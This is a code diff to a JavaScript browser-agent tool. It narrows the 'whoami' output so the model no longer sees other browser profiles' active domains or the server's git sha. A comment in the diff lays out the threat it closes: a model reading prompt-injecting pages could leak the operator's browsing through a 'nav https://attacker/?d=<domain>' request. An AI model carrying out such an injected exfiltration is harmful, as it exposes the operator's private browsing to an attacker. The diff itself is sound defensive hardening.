@@ -315,7 +315,13 @@ export function buildRequest(args, env, token) {
 
 // Pull a compact, model-facing string out of the server's 200 envelope. NEVER
 // dumps a base64 screenshot blob into the model context.
-export function summarizeResult(op, envelope) {
+//
+// `env` is only consulted by `whoami`, to narrow the instance list to the agent's
+// OWN forced instance (see that branch). It defaults to {} so every other op — and
+// every existing caller/test — is unaffected; an absent env simply means "no
+// instance forced", which is already the safe shape (no browsing domains are ever
+// emitted regardless).
+export function summarizeResult(op, envelope, env = {}) {
   const data = (envelope && envelope.data) || {};
   if (op === "text") return typeof data.text === "string" ? data.text : JSON.stringify(data);
   if (op === "html") return typeof data.html === "string" ? data.html : JSON.stringify(data);
@@ -363,23 +369,55 @@ export function summarizeResult(op, envelope) {
   }
   if (op === "whoami") {
     // Identity + diagnostics. `envelope` IS the whole whoami object (no .data).
-    // METADATA ONLY — host label, instance labels, active-tab DOMAINs, versions;
-    // NO page content, NO full URLs.
+    // METADATA ONLY, and NARROWED to the op's stated purpose: "which HOST and
+    // which PROFILE am I on". No page content, no full URLs, and — critically —
+    // no reconnaissance of the OPERATOR'S OTHER PROFILES.
+    //
+    // Two fields the server returns are deliberately DROPPED here:
+    //
+    //  1. `activeTabDomain`, on every instance. The server's whoami_snapshot
+    //     iterates ALL live instances, so a bare passthrough tells the model what
+    //     the operator is browsing in unrelated profiles (e.g. a `banking` profile
+    //     sitting on chase.com while the agent runs on `work`). With no
+    //     --allow-domains set, hostDenied() permits any host, so that is one
+    //     `nav https://attacker/?d=<domain>` away from exfil — by a model that is
+    //     by design reading untrusted, prompt-injecting pages. This is exactly the
+    //     leak the OP_TO_SERVER comment cites as the reason `tabs` is excluded
+    //     ("`tabs` would leak other tabs' URLs"); whoami reintroduced a narrower
+    //     version of it. Dropped unconditionally — the agent never needs to know
+    //     what any tab, including its own, is pointed at (it can read its own).
+    //  2. The git HEAD inside `server_version` ({version, git:<short sha>}). Only
+    //     the human-facing `version` survives; the commit sha is host-internal
+    //     state with no bearing on "which profile am I on".
+    //
+    // The instance list is also FILTERED to the agent's own forced instance
+    // (BROWSER_AGENT_INSTANCE — the same value buildRequest sends as `target`,
+    // set by the wrapper, unsettable by the model). The wrapper accepts either an
+    // auto key or a label there, so match either. If an instance is forced and
+    // nothing matches, return an empty list rather than falling back to "all" —
+    // failing closed on reconnaissance. When no instance is forced (the bridge
+    // auto-routes) the list is left as-is; it then carries only key/label/version,
+    // never a browsing domain.
     const w = envelope || {};
     const host = w.host || {};
     const bridge = w.bridge || {};
     const instances = Array.isArray(w.instances) ? w.instances : [];
+    const sv = bridge.server_version;
+    const own = String(env.BROWSER_AGENT_INSTANCE ?? "").trim();
+    const mine = own
+      ? instances.filter((i) => i.key === own || i.label === own)
+      : instances;
     return JSON.stringify({
       host: { label: host.label ?? null, source: host.source ?? null },
       bridge: {
         endpoint: bridge.endpoint ?? null,
         connected: bridge.connected ?? null,
-        server_version: bridge.server_version ?? null,
+        // Drop the git HEAD: keep only the human-facing version string.
+        server_version: (sv && typeof sv === "object" ? sv.version : sv) ?? null,
         extension_version_current: bridge.extension_version_current ?? null,
       },
-      instances: instances.map((i) => ({
+      instances: mine.map((i) => ({
         key: i.key ?? null, label: i.label ?? null,
-        activeTabDomain: i.activeTabDomain ?? null,
         extension_version: i.extension_version ?? null,
       })),
     });
@@ -480,7 +518,7 @@ export async function runBrowserOp(args, opts = {}) {
   }
   // whoami returns the diagnostic object DIRECTLY ({ok,host,bridge,instances}) —
   // there is no {result:<envelope>} wrapper like /cmd. Summarize it as-is.
-  if (op === "whoami") return summarizeResult("whoami", outer);
+  if (op === "whoami") return summarizeResult("whoami", outer, env);
   const envelope = outer && outer.result;
   if (envelope && envelope.ok === false) {
     // An op-level failure in the page (e.g. owned_tab_gone) — surface to the model.
